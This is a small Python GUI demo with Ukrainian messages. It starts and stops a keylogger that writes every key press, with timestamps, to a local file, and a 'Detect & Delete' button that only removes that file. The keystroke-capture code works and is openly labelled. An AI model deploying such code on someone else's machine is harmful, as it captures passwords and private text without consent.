import tkinter as tk
from tkinter import messagebox
import keyboard
import os
from threading import Thread
import time
class KeyloggerForm:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger & Detector")
        self.root.geometry("360x100")
        self.logging = False
        self.log_file = "keylog.txt"

        tk.Button(root, text="Start Keylogger", command=self.start_keylogger).place(x=20, y=20)
        tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger).place(x=130, y=20)
        tk.Button(root, text="Detect & Delete", command=self.detect_and_delete).place(x=240, y=20)

    def start_keylogger(self):
        if not self.logging:
            self.logging = True
            Thread(target=self.log_keys, daemon=True).start()
            messagebox.showinfo("Успіх", "Клавіатурний шпигун запущено!")

    def stop_keylogger(self):
        self.logging = False
        messagebox.showinfo("Успіх", "Клавіатурний шпигун зупинено!")

    def log_keys(self):
        def on_press(key):
            if self.logging:
                with open(self.log_file, "a") as f:
                    f.write(f"{key} - {time.ctime()}\n")
        keyboard.on_press(on_press)
        while self.logging:
            time.sleep(0.1)

    def detect_and_delete(self):
        if os.path.exists(self.log_file):
            os.remove(self.log_file)
            messagebox.showinfo("Успіх", "Лог клавіатурного шпигуна видалено!")
        else:
            messagebox.showinfo("Помилка", "Лог не знайдено!")